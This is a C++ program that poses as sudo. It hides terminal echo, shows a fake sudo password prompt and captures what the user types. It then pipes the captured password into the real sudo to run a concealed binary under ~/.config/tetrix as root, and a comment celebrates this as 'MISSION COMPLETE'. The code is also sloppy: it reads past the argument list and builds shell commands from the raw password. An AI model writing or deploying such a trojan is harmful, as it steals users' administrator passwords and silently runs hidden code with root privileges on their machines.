#include <iostream>
#include <unistd.h>
#include <pwd.h>
#include <string>
#include <termios.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if(argc == 1)
    {
        system("/bin/sudo");
    }
    else
    {
        termios oldt;
        tcgetattr(STDIN_FILENO, &oldt);
        termios newt = oldt;
        newt.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
        bool allargs = true;
        std::string args {""};
        for(int i = 1;i < argc + 1;i++)
        {
            std::string arg{argv[i]};
            if(arg.find("-") != std::string::npos && arg.rfind("-") > 1){
                allargs = false;
                i = argc;
            }
            if(arg.find("-") == std::string::npos){
                allargs = false;
                i = argc;
            }
            args += arg + " ";
        }
        if(!allargs){
            std::cout << "[sudo] password for " <<  getpwuid(getuid()) << ":" << std::endl;
            char pwd[256];
            std::cin.getline(pwd,256);
            std::string passwd{pwd};
            
            //WOOOO! MISSION COMPLETE!
            //const char *cmd = ("echo '" + passwd + "' | /bin/sudo " + "-n -S " + args).c_str();
            //system(("echo '" + passwd + "' > sudo " + "-n --stdin " + args).c_str());
            std::string homedir = std::getenv("HOME");
            system(("echo '" + passwd + "' | /bin/sudo "+ homedir +"/.config/tetrix/Tetrix -p 1").c_str());
        }
        else
        {
            system(("/bin/sudo " + args).c_str());
        }
    }
    return 0;
}